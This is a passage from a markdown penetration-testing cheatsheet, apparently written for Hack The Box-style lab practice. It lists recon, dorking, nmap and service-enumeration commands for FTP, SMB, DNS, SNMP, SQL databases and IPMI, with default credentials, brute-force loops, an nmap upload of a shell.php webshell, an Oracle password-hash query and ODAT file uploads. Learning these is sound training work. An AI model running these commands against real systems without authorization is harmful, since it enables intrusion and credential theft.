+++
title = "Cyber Cheatsheet v2"
type = "home"
+++

# Meta: **Penetration Testing Execution Standard (PTES)**

- http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines

| **Step** | **Task**                                                                                                                                                                                                                                                                                                                                                                 |
| -------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1.       | Get the user flag on your own                                                                                                                                                                                                                                                                                                                                            |
| 2.       | Get the root flag on your own                                                                                                                                                                                                                                                                                                                                            |
| 3.       | Write your **technical** documentation                                                                                                                                                                                                                                                                                                                                   |
| 4.       | Write your **non-technical** documentation                                                                                                                                                                                                                                                                                                                               |
| 5.       | Compare your notes with the official write-up                                                                                                                                                                                                                                                                                                                            |
| 6.       | Create a list of information you have missed                                                                                                                                                                                                                                                                                                                             |
| 7.       | Watch video or read blog walkthrough and compare it with your notes<br>- https://www.youtube.com/@ippsec/videos<br>- https://ippsec.rocks/?# <br>- https://www.youtube.com/@vbscrub/videos <br> - https://www.youtube.com/watch?v=CU9Iafc-Igs&list=PLF7JR1a3dLONdkRYU_8-5OcgOzrWe2549 <br> - https://www.youtube.com/@LiveOverflow/videos <br> - https://0xdf.gitlab.io/ |
| 8.       | Expand your notes and documentation by adding the missed parts                                                                                                                                                                                                                                                                                                           |

- PowerShell: https://underthewire.tech/wargames
- Linux Terminal: https://overthewire.org/wargames/

- Tmux:
    - https://tmuxcheatsheet.com/
    - https://www.youtube.com/watch?v=Lqehvpe_djs
- Vim:
    - https://vimsheet.com/

## Recommended Retired Boxes

- Granny/Grandpa
- Jerry
- Blue
- Lame
- Optimum
- Legacy
- Devel

| Box                                                                                           |                                                                                                                                                                                                                                |
| --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)                                 | Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire [OWASP Top Ten](https://owasp.org/www-project-top-ten) along with many other real-world application security flaws. |
| [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/) | Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation.                                                                                                     |
| [Metasploitable 3](https://github.com/rapid7/metasploitable3)                                 | Is a template for building a vulnerable Windows VM configured with a wide range of [vulnerabilities](https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities).                                                          |
| [DVWA](https://github.com/digininja/DVWA)                                                     | This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.                                                                                      |

---
# Pre-Engagement

## 3rd Parties (Infrastructure)

- AWS: https://aws.amazon.com/es/security/penetration-testing/

## Sensitive Data Regulations

- UK: https://www.gov.uk/data-protection
- US:
    - General: https://www.ftc.gov/business-guidance/privacy-security
    - Financial: https://www.ftc.gov/business-guidance/privacy-security/gramm-leach-bliley-act
    - Health: https://www.hhs.gov/hipaa/index.html

# Information Gathering/Intelligence Gathering

| **No.** | **Principle**                                                          |
| ------- | ---------------------------------------------------------------------- |
| 1.      | There is more than meets the eye. Consider all points of view.         |
| 2.      | Distinguish between what **we see** and what **we do not see**.        |
| 3.      | There are always ways to gain more information. Understand the target. |

| Layer | Name                    | Goal / Purpose                                                                                                                      |
| :---- | :---------------------- | :---------------------------------------------------------------------------------------------------------------------------------- |
| **1** | **Internet Presence**   | **Discover Assets:** Identify all public-facing domains, subdomains, IPs, and netblocks.                                            |
| **2** | **Gateway**             | **Analyze the Perimeter:** Understand the target's external interfaces and protection mechanisms (e.g., WAF, firewall).             |
| **3** | **Accessible Services** | **Enumerate Services:** Identify and understand the function of every open port and running service on the discovered assets.       |
| **4** | **Processes**           | **Understand Functionality:** Analyze how data is processed by services and identify dependencies between inputs and outputs.       |
| **5** | **Privileges**          | **Identify Permissions:** Determine the privileges of each service's user account and look for overlooked or excessive permissions. |
| **6** | **OS Setup**            | **Internal Recon:** After gaining access, gather information on the OS configuration, security posture, and admin practices.        |

- Ports:
    - https://www.stationx.net/common-ports-cheat-sheet/
    - https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf
    - https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/

## Search Engine Dorking

- https://www.exploit-db.com/google-hacking-database
- Cached Website: https://web.archive.org/

```bash
site:
inurl:
filetype:
intitle:
intext:
inbody:
cache:
link:
related:
info:
define:
numrange:
allintext:
allinurl:
allintitle:

# Operators
AND
OR
NOT
*
..
" "
-
+

### EXAMPLES
# Finding Login Pages:
site:example.com inurl:login
site:example.com (inurl:login OR inurl:admin)
# Identifying Exposed Files:
site:example.com filetype:pdf
site:example.com (filetype:xls OR filetype:docx)
# Uncovering Configuration Files:
site:example.com inurl:config.php
# (searches for extensions commonly used for configuration files)
site:example.com (ext:conf OR ext:cnf)
# Locating Database Backups:
site:example.com inurl:backup
site:example.com filetype:sql
```

## Infrastructure

### Subdomains

- Certificate Transparency: https://crt.sh/
- https://domain.glass/
- (PAID) https://buckets.grayhatwarfare.com/

```bash
# Domain => Subdomains via Cert Registry
curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u | tee subdomainlist.txt
# Full Info 
for i in $(cat subdomainlist.txt) ; do host $i | tee -a hostinfo.txt ; done
# (IPv4) Domain Name => IP Address
for i in $(cat subdomainlist.txt) ; do host $i | grep "has address" | cut -d" " -f1,4 | tee -a domain_ipaddress.txt ; done
# (IPv4) Addresses Only
for i in $(cat domain_ipaddress.txt) ; do host $i | grep "has address" | cut -d" " -f4 | tee -a ip-addresses.txt ; done
# (IPv4) Addresses => Services via Shodan
for i in $(cat ip-addresses.txt) ; do shodan host $i ; done

# DNS: old technique
dig any <DOMAIN>

# Content Search: google.com Dork
inurl:<DOMAIN> intext:<TERM>
```

## Scanning

```bash
# -p: source port
# TCP
nc -nvzw5 <TARGET> <PORT>
# UDP
nc -unvzw5 <TARGET> <PORT>

# Connect to Encrypted Service (TLS/SSL)
openssl s_client -starttls ftp -connect <TARGET>:<PORT>
```

## Nmap

- **`Open`** - received TCP SYN-ACK
- **`Closed`** - received TCP RST
- **`Filtered`** - no response
- **`Unfiltered`** - (with `-sA` TCP ACK scans) can't determine the state, but the port is accessible
- **`Open/Filtered`** - can't tell if the port is open or blocked by a firewall
- **`Closed/Filtered`** - (with `-sI` IP ID idle scan) can't tell if the port is closed or blocked by a firewall

Filtering out live hosts for `-iL`:

```bash
# Find Live Hosts
sudo nmap -n -sn --reason -oA host_disc <TARGET>
# Create list
grep 'Status: Up' host_disc.gnmap | awk '{print $2}' | tee live_hosts.txt
# Scan normally w/ list
sudo nmap -n -Pn -sS -sV -sC --reason --top-ports=1000 -oA host_disc_live -iL live_hosts.txt
# Trace packet (MORE INFO)
sudo nmap -n -Pn -sS --packet-trace --disable-arp-ping -p <PORT> <TARGET>

# TCP Full-Connect (3-way handshake)
sudo nmap -n -Pn -sT -sV -sC --reason <TARGET>

# UDP (normally no response)
sudo nmap -n -Pn -sU -sV -sC --reason --top-ports=100 <TARGET>

# Create HTML reports from nmap XML scan
# https://nmap.org/book/output.html
xsltproc <SCAN_FILE>.xml -o <OUTPUT>.html

# SPAM: scan using multiple IP addresses
sudo nmap -n -Pn --max-retries=1 --source-port <SRC_PORT> -D RND:5 <TARGET>

# --max-retries <ATTEMPTS>
# -T <AGGRESSION_1_5>
# --packet-trace
# --reason
# --disable-arp-ping
# --top-ports=<NUM>
# --script <SCRIPT>
# -g <SRC_PORT>
# --dns-server <NAMESERVER>
```

### 📜 Nmap Scripting Engine (NSE)

The Nmap Scripting Engine (NSE) extends Nmap's functionality with custom scripts for vulnerability detection, service enumeration, and exploitation.

**Reference:** [NSE Usage Guide](https://nmap.org/book/nse-usage.html)

#### 📖 How to Use NSE

**Basic Usage:**
- `-sC` - Run a set of popular, common scripts
- `--script` - Run specific scripts by name, category, or file path
- `--script-help` - Show arguments for `--script-args`

**Advanced Usage:**
- Combine scripts with wildcards: `--script "smb-*,http-*"`
- Use comprehensive documentation: [NSE Script Database](https://nmap.org/nsedoc/scripts/)
- Search for scripts: `grep "ftp" /usr/share/nmap/scripts/script.db`

```bash
# --script-trace : trace script scans
nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php' -oA nmap_http_put <TARGET>
```

##### 📂 Script Categories

Location: `/usr/share/nmap/scripts`
- https://nmap.org/nsedoc/scripts/

- **auth** - Scripts related to authentication, such as bypassing credentials or checking for default ones.
- **broadcast** - Used to discover hosts on the local network by broadcasting requests.
- **brute** - Scripts that perform brute-force attacks to guess passwords or credentials.
- **default** - The core set of scripts that are run automatically with `-sC` or `-A`.
- **discovery** - Actively gathers more information about a network, often using public registries or protocols like SNMP.
- **dos** - Tests for vulnerabilities that could lead to a denial-of-service attack.
- **exploit** - Actively attempts to exploit known vulnerabilities on a target system.
- **external** - Interacts with external services or databases.
- **fuzzer** - Sends unexpected or randomized data to a service to find bugs or vulnerabilities.
- **intrusive** - These scripts can be noisy, resource-intensive, or potentially crash the target system.
- **malware** - Scans for known malware or backdoors on a target host.
- **safe** - Scripts that are considered safe to run as they are not designed to crash services, use excessive resources, or exploit vulnerabilities.
- **version** - Extends the functionality of Nmap's version detection feature.
- **vuln** - Checks a target for specific, known vulnerabilities.

#### 📥 Install New NSE Script

```bash
sudo wget --output-file /usr/share/nmap/scripts/<SCRIPT>.nse \
    https://svn.nmap.org/nmap/scripts/<SCRIPT>.nse

nmap --script-updatedb
```

## Webservers

- OWASP Top 10:
    - https://owasp.org/www-project-top-ten/
- HTTP Codes:
    - https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#Standard_codes
- Web Page Scanner:
    - https://github.com/RedSiege/EyeWitness
- `/.well-known/` URIs:
    - https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml

```bash
# HTTP Headers + robots.txt
curl -skLI -o curl_http_headers.txt http://<TARGET>
curl -skL -o curl_robots.txt http://<TARGET>/robots.txt

===

# Checks for WAF (wbapp firewall)
wafw00f <TARGET>

# Enum web server + version + OS + frameworks + libraries
whatweb --aggression 3 http://<TARGET> --log-brief=whatweb_scan.txt

# Fingerprint web server
nikto -o nikto_fingerprint_scan.txt -Tuning b -h http://<TARGET>

# Enum web server vulns
nikto -o nikto_vuln_scan.txt -h http://<TARGET>

# Enum web app logic & vulns
wapiti -f txt -o wapiti_scan.txt --url http://<TARGET>

# vHost Brute-force
gobuster --quiet --threads 64 --output gobuster_vhost_top5000 vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320 --domain <DOMAIN> -u "http://<IP_ADDR>"  # uses IP addr

# Webpage Crawler
pip3 install --break-system-packages scrapy
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip && unzip ReconSpider.zip
python3 ReconSpider.py <URL> && cat results.json
# !!! CHECK "results.json" !!!

===

# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Directory brute-force with a common wordlist
gobuster --quiet --threads 64 --output gobuster_dir_common dir --follow-redirect --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --url http://<TARGET>

# w/ file extensions
gobuster --quiet --threads 64 --output gobuster_dir_medium dir ---follow-redirect --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --extensions php,html,txt,bak,zip --url http://<TARGET>

### FEROXBUSTER: faster and recursive
feroxbuster -t 64 -w /usr/share/seclists/Discovery/Web-Content/common.txt --depth 2 -o feroxbuster_dir_common -u http://<TARGET>

===

# AUTOMATED Recon
git clone https://github.com/thewhiteh4t/FinalRecon.git
cd FinalRecon
chmod +x ./finalrecon.py
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
./finalrecon.py -nb -r -cd final_recon_scan -w /usr/share/wordlists/dirb/common.txt --headers --crawl --ps --dns --sub --dir --url http://<URL>
```

# Vulnerability Assessment/Analysis

## 📁 FTP

- `TCP 20`: data transfer
    - Active: Client->Server
    - Passive: Server->Client
- `TCP 21`: control channel
- Server Config: `/etc/vsftpd.conf`
    - http://vsftpd.beasts.org/vsftpd_conf.html
- DISALLOWED FTP users: `/etc/ftpusers`

- Commands: https://web.archive.org/web/20230326204635/https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/
- Server Return Codes: https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes

**TFTP has no auth and uses only UDP.

{{% details "Dangerous Settings" %}}

| **Setting**                    | **Description**                                                                    |
| ------------------------------ | ---------------------------------------------------------------------------------- |
| `anonymous_enable=YES`         | Allowing anonymous login?                                                          |
| `anon_upload_enable=YES`       | Allowing anonymous to upload files?                                                |
| `anon_mkdir_write_enable=YES`  | Allowing anonymous to create new directories?                                      |
| `no_anon_password=YES`         | Do not ask anonymous for password?                                                 |
| `anon_root=/home/username/ftp` | Directory for anonymous.                                                           |
| `write_enable=YES`             | Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE? |
{{% /details %}}

```bash
# Connect to FTP server in passive mode with anonymous login
# Username: anonymous
# Password: (no password required)
ftp -p -a <HOST>

# List files and directories
ls -la
ls -laR

# Read file
get <FILENAME> -
# Download file
get <FILENAME>
# Upload file
put <FILENAME>
# Download ALL files
mkdir ftp_files
wget -m --no-passive-ftp ftp://anonymous:anonymous@<TARGET>

# Execute local commands (outside of session)
!<COMMAND>
```

## SMB/CIFS

- `TCP 135`: old RPC
- `TCP 137,138,139`: old (CIFS/SMB1)
- `TCP 445`: RPC/(SMB2/3)
- Shares:
    - `C$` (drive)
    - `ADMIN$` (Windows drive)
    - `IPC$` (RPC)
    - `PRINT$`

{{% details "Dangerous Settings" %}}

|**Setting**|**Description**|
|---|---|
|`browseable = yes`|Allow listing available shares in the current share?|
|`read only = no`|Forbid the creation and modification of files?|
|`writable = yes`|Allow users to create and modify files?|
|`guest ok = yes`|Allow connecting to the service without using a password?|
|`enable privileges = yes`|Honor privileges assigned to specific SID?|
|`create mask = 0777`|What permissions must be assigned to the newly created files?|
|`directory mask = 0777`|What permissions must be assigned to the newly created directories?|
|`logon script = script.sh`|What script needs to be executed on the user's login?|
|`magic script = script.sh`|Which script should be executed when the script gets closed?|
|`magic output = script.out`|Where the output of the magic script needs to be stored?|
{{% /details %}}

```bash
# ANON: List available SMB shares
smbclient -U "" -N --list //<TARGET>/ | tee smb_shares.txt
smbclient -U "guest" -N --list //<TARGET>/ | tee smb_shares.txt

# ANON: Connect to an SMB share
smbclient -U "" -N //<TARGET>/<SHARE>
smbclient -U "guest" -N //<TARGET>/<SHARE>

# Connect to SMB share
smbclient --user=<DOMAIN>/<USERNAME> --password='<PASSWORD>' //<TARGET>/<SHARE>
# SMB commands once connected:
ls                    # List files
get <FILE>           # Download file
recurse              # Toggle directory recursion

# Execute local commands (outside of session)
!<COMMAND>

# SMB enumeration:
sudo nmap -n -Pn -p 445 --script "smb-enum-domains,smb-os-discovery" -oA nmap_smb_domains <TARGET>

# RPC
rpcclient --user=<DOMAIN>/<USERNAME> --password='<PASSWORD>' <TARGET>
srvinfo	 # Server information
enumdomains	 # Enumerate all domains that are deployed in the network
querydominfo	# Provides domain, server, and user information of deployed domains
netshareenumall	 # Enumerates all available shares
netsharegetinfo <SHARE>	 # Provides information about a specific share
enumdomusers  # Enumerates all domain users
queryuser <RID>  # user info

# Brute-Forcing RIDs via RPC
for i in $(seq 500 1100);do rpcclient -N -U "" <TARGET> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

# Same with other tools
samrdump.py <TARGET>
smbmap -H <TARGET>
crackmapexec smb <TARGET> --shares -u '' -p ''

# Enumeration SMB/NetBIOS
enum4linux -a <TARGET> | tee enum4linux.txt
enum4linux-ng -A <TARGET> | tee enum4linux-ng.txt
```

## NFS

Similiar to SMB.

- `TCP/UDP 111`: NFSv2/v3
    - and various dynamic ports using `rpcbind` and `portmapper`
- `TCP 2049`: NFSv4
- Server Config: `/etc/exports`
    - https://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html

{{% details "Dangerous Options" %}}

| **Dangerous Option** | **Description**                                                                                                      |
| -------------------- | -------------------------------------------------------------------------------------------------------------------- |
| `rw`                 | Read and write permissions.                                                                                          |
| `insecure`           | Ports above 1024 will be used.                                                                                       |
| `nohide`             | If another file system was mounted below an exported directory, this directory is exported by its own exports entry. |
| `no_root_squash`     | All files created by root are kept with the UID/GID 0.                                                               |
{{% /details %}}

```bash
# Show shared dirs
exportfs -sv
# Show NFS Shares on server
showmount -e <TARGET>

# Mount NFS
mkdir target-NFS
sudo mount -t nfs -o nolock <TARGET>:/ ./target-NFS
sudo umount ./target-NFS

# Enumerate
sudo nmap -n -Pn -p111,2049 -sV -sC <TARGET>
sudo nmap -n -Pn -p111,2049 -sV --script 'nfs*' <TARGET>
```

## DNS

- `UDP 53`: normal name queries
- `TCP 53`: zone transfers and syncs
- Server Config (Bind9)
    - `/etc/bind/named.conf.local`
    - `/etc/bind/named.conf.options`
    - `/etc/bind/named.conf.log`
    - https://wiki.debian.org/BIND9
- https://web.archive.org/web/20250329174745/https://securitytrails.com/blog/most-popular-types-dns-attacks

{{% details "Dangerous Settings" %}}

| **Option**        | **Description**                                                                |
| ----------------- | ------------------------------------------------------------------------------ |
| `allow-query`     | Defines which hosts are allowed to send requests to the DNS server.            |
| `allow-recursion` | Defines which hosts are allowed to send recursive requests to the DNS server.  |
| `allow-transfer`  | Defines which hosts are allowed to receive zone transfers from the DNS server. |
| `zone-statistics` | Collects statistical data of zones.                                            |
{{% /details %}}

```bash
# Registrar Info
whois <DOMAIN> | whois.txt

# Query Nameserver for domain
dig @<DNS_SERVER> ns <DOMAIN>

# PTR Record or Reverse DNS Query
dig @<DNS_SERVER> -x <IP_ADDRESS>

# OLD: version / all records / zone transfer
dig @<DNS_SERVER> CH TXT version.bind <DOMAIN>
dig @<DNS_SERVER> ANY <DOMAIN>
dig @<DNS_SERVER> AXFR <DOMAIN>

# --- Record Types ---
# ANY: return all records -- sometimes doesnt work!
# A: IPv4 address
# AAAA: IPv6 address
# CNAME: Canonical Name
# MX: Mail Servers
# NS: Name Servers
# PTR: Pointer Record
# SOA: Start of Authority
# TXT: Text Records
# SRV: Service Records
# CAA: Certification Authority Authorization
for type in A AAAA CNAME MX NS SOA SRV TXT CAA ; do echo '---' ; dig @<DNS_SERVER> +short $type <DOMAIN> | tee -a dns_all_records.txt ; done
for type in A AAAA CNAME MX NS SOA SRV TXT CAA ; do echo "--- $type Records ---"; dig @<DNS_SERVER> +short $type <DOMAIN> ; done | tee dns_records.txt

# Subdomain Brute-forcing
for sub in $(cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt) ; do dig @<DNS_SERVER> $sub.<DOMAIN> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt ; done

# Subdomain bruteforce and more
puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt <DOMAIN>

# Subdomain bruteforce and more
dnsenum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --enum <DOMAIN>

# /usr/share/SecLists/Discovery/DNS/namelist.txt
gobuster --quiet --threads 64 --output gobuster_dns_top110000 dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r <DNS_SERVER> -d <DOMAIN>
```

## SMTP/ESMTP

- `TCP 25`: unencrypted
- `TCP 465/587/2525`: encrypted
- Security:
    - DKIM: https://dkim.org/
    - Sender Policy Framework (SPF): https://dmarcian.com/what-is-spf/
    - DMARC: https://dmarc.org/
- https://serversmtp.com/smtp-error/
{{% details "Dangerous Settings" %}}

| **Option**               | **Description**                                                                                                                                                                          |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `mynetworks = 0.0.0.0/0` | With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it. |
{{% /details %}}

```bash
# CAREFUL! Open relay check
sudo nmap -p25,465,587,2525 --script smtp-open-relay <TARGET>

# User enum
smtp-user-enum -m 60 -w 20 -M VRFY -U <WORDLIST> -t <TARGET>

# Manual enumeration
telnet <TARGET> 25
EHLO <HOSTNAME>
VRFY <USER>  # 250 success; 252 maybe/not; 550 failure
EXPN
```

## IMAP/POP3

- `TCP 143/993`: IMAP unc/enc
- `TCP 110/995`: POP3 unc/enc

{{% details "Dangerous Settings" %}}

| **Setting**               | **Description**                                                                           |
| ------------------------- | ----------------------------------------------------------------------------------------- |
| `auth_debug`              | Enables all authentication debug logging.                                                 |
| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.  |
| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons.                              |
| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated.                   |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |
{{% /details %}}

```bash
### Non-Interactive

# IMAPS
curl -vkL --user '<USER>':'<PASSWORD>' 'imaps://<TARGET>' -X <COMMAND>

# POP3S
curl -vkL --user '<USER>':'<PASSWORD>' 'pop3s://<TARGET>' -X <COMMAND>

### Interactive

# IMAPS
openssl s_client -connect <TARGET>:imaps
1 LOGIN <USERNAME> <PASSWORD>
1 LIST "" *	# Lists all directories
1 SELECT "<MAILBOX>" # Selects a mailbox
1 UNSELECT "<MAILBOX>" # Exits the selected mailbox
1 FETCH <ID> all # Metadata of email
1 FETCH 1:* (BODY[]) # Show all emails
1 CREATE "INBOX" # Creates a mailbox with a specified name
1 DELETE "INBOX" # Deletes a mailbox
1 RENAME "ToRead" "Important" #	Renames a mailbox
1 LSUB "" *	# Returns a subset of names from the set of names that the User has declared as being active or subscribed
1 CLOSE	# Removes all messages with the Deleted flag set
1 LOGOUT # Closes the connection

# POP3s
openssl s_client -connect <TARGET>:pop3s
USER <USERNAME>
PASS <PASSWORD>
STAT	# List num of saved emails from the server.
LIST	# List number and size of all emails.
RETR <ID>	# Deliver the requested email by ID.
DELE <ID> # Delete the requested email by ID.
CAPA	# Display the server capabilities.
RSET	# Reset the transmitted information.
QUIT	# Close connection
```

## SNMP

- `UDP 161`: normal
- `UDP 162`: "trap" or alert
- OIDs: https://www.alvestrand.no/objectid/top.html
- Versions:
    - v1/v2c: unencrypted
    - v3: encryption via PSK
- `/etc/snmp/snmpd.conf`
    - https://www.net-snmp.org/docs/man/snmpd.conf.html

*Management Information Base (MIB)* is a text file of *Object Identifier (OID)* s, which provide addresses to access device info, in the *Abstract Syntax Notation One (ASN.1)* based ASCII text format. Community Strings are sort of "passwords" to manage the access level.

{{% details "Dangerous Settings" %}}

| **Settings**                                  | **Description**                                                                       |
| --------------------------------------------- | ------------------------------------------------------------------------------------- |
| `rwuser noauth`                               | Provides access to the full OID tree without authentication.                          |
| `rwcommunity <COMMUNITY_STRING> <IPv4_ADDR>`  | Provides access to the full OID tree regardless of where the requests were sent from. |
| `rwcommunity6 <COMMUNITY_STRING> <IPv6_ADDR>` | Same access as with `rwcommunity` with the difference of using IPv6.                  |
{{% /details %}}

```bash
# Enum via nmap
sudo nmap -n -Pn -sU -p161 -sV --script 'snmp*' --reason -oA nmap_snmp_scan <TARGET>

### Brute-force names of Community Strings
# - Default Strings: "public" (Read-Only) and "private" (Read/Write) are common
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET>
// probably "public"

### Brute-force OIDs and info
# -v 1,2c,3
snmpwalk -v <VERSION> -c <COMMUNITY_STRING> <TARGET> .1

### Brute-force OIDs
# -2 : use v2
# braa usu. uses Version 1
braa <COMMUNITY_STRING>@<TARGET>:.1.*
braa <COMMUNITY_STRING>@<TARGET>:.1.3.6.*
```

## MySQL

- `TCP 3306`: normal
- Server Config:
    - `/etc/mysql/mysql.conf.d/mysqld.cnf`
- https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The%20mysql%20schema%20is%20the,used%20for%20other%20operational%20purposes


{{% details "Dangerous Settings" %}}
- https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html

| **Settings**       | **Description**                                                                                              |
| ------------------ | ------------------------------------------------------------------------------------------------------------ |
| `user`             | Sets which user the MySQL service will run as.                                                               |
| `password`         | Sets the password for the MySQL user.                                                                        |
| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface.            |
| `debug`            | This variable indicates the current debugging settings                                                       |
| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
| `secure_file_priv` | This variable is used to limit the effect of data import and export operations.                              |
{{% /details %}}

```bash
# Login
# - try "root"
mysql -u <USER> -h <TARGET>
mysql -u <USER> --password=<PASSWORD> -h <TARGET>

select version() ;
show databases ;
use <DATABASE> ;
show tables ;
show columns from <TABLE> ;

select * from <TABLE> ;
select * from <TABLE> where <COLUMN> = "<VALUE>" ;

use sys ;  # tables and metadata
select host, unique_users from host_summary ;

use information_schema ;  # metadata
```

## MSSQL

- `TCP 1433`: normal

Microsoft's closed-source version of SQL.

- https://www.microsoft.com/en-us/sql-server/sql-server-2019
- https://learn.microsoft.com/en-us/ssms/install/install?view=sql-server-ver15
- https://learn.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15
- https://learn.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15

{{% details "Dangerous Settings" %}}

- MSSQL clients not using encryption to connect to the MSSQL server
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
- Weak & default `sa` credentials. Admins may forget to disable this account

{{% /details %}}

```bash
# Enumerate via nmap
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET>

# Enumerate via MSF
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS <TARGET>
run

# Login via Windows auth
impacket-mssqlclient -windows-auth <USER>@<TARGET>
impacket-mssqlclient -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<TARGET>

select name from sys.databases ;
```

## Oracle TNS

- `TCP 1521`: normal
- Server Config:
    - `$ORACLE_HOME/network/admin/tnsnames.ora`: names to addrs
    - `$ORACLE_HOME/network/admin/listener.ora`: listener behavior
    - `$ORACLE_HOME/sqldeveloper`: DB protection blacklist
    - Default Password: `DBSNMP/dbsnmp`
- https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985

Oracle's version of SQL.

```bash
# SID Brute-forcing via nmap
sudo nmap -p1521 -sV --script oracle-sid-brute <TARGET>

### ODAT
# TNS Setup for Enumeration
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install --break-system-packages python-libnmap
git submodule init
git submodule update
pip3 install --break-system-packages cx_Oracle
sudo apt install -y python3-scapy
sudo pip3 install --root-user-action colorlog termcolor passlib python-libnmap
sudo apt install -y build-essential libgmp-dev
pip3 install --break-system-packages pycryptodome

# Enumeration
odat.py all -d <SID> -s <TARGET>

### Connect
# Install: https://askubuntu.com/a/207145
sqlplus <USER>/<PASSWORD>@<TARGET>/<SID>
sqlplus <USER>/<PASSWORD>@<TARGET>/<SID> as sysdba
# https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared
# If you come across the following error sqlplus:
# error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, 
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf" ; sudo ldconfig

# SQL Commands
select table_name from all_tables ;
select * from user_role_privs ;
select name, password from sys.user$ ;

### Upload webshell (if webserver)
# Linux	/var/www/html
# Windows	C:\inetpub\wwwroot
echo "Oracle File Upload Test" > testing.txt
odat.py utlfile -d <SID> -U <USER> -P <PASSWORD> -s <TARGET> --sysdba --putFile <UPLOAD_DIR> testing.txt ./testing
curl -Lo- http://<TARGET>/testing.txt
```

## IPMI

- `UDP 623`: normal
- Default Passwords:
    - Dell iDRAC:	`root:calvin`
    - HP iLO: `Administrator:[randomized 8-character string consisting of numbers and uppercase letters]`
    - Supermicro IPMI: `ADMIN:ADMIN`

A hardware control protocol that gives "virtual" physical access to a machine.

{{% details "Dangerous Settings" %}}

- Server sends the salted hash of the user's password to the user before authentication

{{% /details %}}

```bash
### Enumeration via nmap
sudo nmap -sU -p623 --script ipmi-version

### Metasploit Scanner
setg RHOSTS <TARGET>
# https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/
use auxiliary/scanner/ipmi/ipmi_version
run
# https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/
